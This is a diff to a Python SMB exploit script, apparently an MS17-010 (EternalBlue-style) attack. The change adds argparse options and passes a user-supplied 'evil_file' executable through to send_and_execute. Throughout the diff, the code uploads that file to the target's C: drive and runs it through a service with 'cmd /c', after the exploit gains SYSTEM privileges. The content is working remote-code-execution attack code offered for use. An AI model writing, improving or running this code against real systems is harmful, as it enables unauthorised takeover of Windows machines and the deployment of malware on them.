@@ -1,4 +1,5 @@
-#!/usr/bin/python3
+#!/usr/bin/python
+import argparse
 import os.path
 import random
 import socket
@@ -834,7 +835,7 @@ def create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroup
     return fakeUserAndGroupCount, fakeUserAndGroups
 
 
-def exploit(target, port, pipe_name):
+def exploit(target, port, evil_file, pipe_name):
     print('Trying to connect to %s:%d' % (target, port))
     conn = MYSMB(target, port)
 
@@ -944,7 +945,7 @@ def exploit(target, port, pipe_name):
     # do whatever we want as SYSTEM over this SMB connection
     # ================================
     try:
-        send_and_execute(conn, info['arch'])
+        send_and_execute(conn, info['arch'], evil_file)
     except:
         pass
 
@@ -1033,7 +1034,7 @@ def random_generator(size=6, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for x in range(size))
 
 
-def send_and_execute(conn, arch):
+def send_and_execute(conn, arch, file_to_send):
     smbConn = conn.get_smbconnection()
 
     filename = "%s.exe" % random_generator(6)
@@ -1044,7 +1045,7 @@ def send_and_execute(conn, arch):
     # smb_send_file(smbConn, lfile, 'C', '/windows/temp/%s' % filename)
     # service_exec(conn, r'cmd /c c:\windows\temp\%s' % filename)
 
-    smb_send_file(smbConn, lfile, 'C', '/%s' % filename)
+    smb_send_file(smbConn, file_to_send, 'C', '/%s' % filename)
     service_exec(conn, r'cmd /c c:\%s' % filename)
 
 
@@ -1113,24 +1114,40 @@ def service_exec(conn, cmd):
     rpcsvc.disconnect()
 
 
-if len(sys.argv) < 2:
-    print("{} <ip> <executable_file> [port] [pipe_name]".format(sys.argv[0]))
+def get_arguments():
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument('target', action='store',
+                        help='[[domain/]username[:password]@]<targetName or address>')
+    parser.add_argument('executable_file', action='store',
+                        help='An executable file to upload and run in the vulnerable system')
+
+    group = parser.add_argument_group('connection')
+    group.add_argument('--target-ip', action='store', metavar="ip address",
+                       help='IP Address of the target machine. If ommited it will use whatever was specified as '
+                            'target. This is useful when target is the NetBIOS name and you cannot resolve it')
+    group.add_argument('--port', nargs='?', default=445, metavar="destination port",
+                       help='Destination port to connect to SMB Server')
+    group.add_argument('--pipe', default=None,
+                       help='An available named pipe to use for the exploitation')
+
+    if len(sys.argv) < 2:
+        parser.print_help()
+        sys.exit(1)
+    options = parser.parse_args()
+    return options
+
+
+options = get_arguments()
+
+target = options.target
+evil_file = options.executable_file
+port = int(options.port)
+pipe_name = options.pipe
+
+if not os.path.isfile(evil_file):
+    print("[-] No such file: %s" % evil_file)
     sys.exit(1)
 
-target = sys.argv[1]
-lfile = sys.argv[2]
-port = 445
-pipe_name = None if len(sys.argv) < 5 else sys.argv[4]
-
-try:
-    if sys.argv[3] != '':
-        port = int(sys.argv[3])
-except:
-    pass
-
-if not os.path.isfile(lfile):
-    print("File not found %s" % lfile)
-    sys.exit(1)
-
-exploit(target, port, pipe_name)
+exploit(target, port, evil_file, pipe_name)
 print('Done')
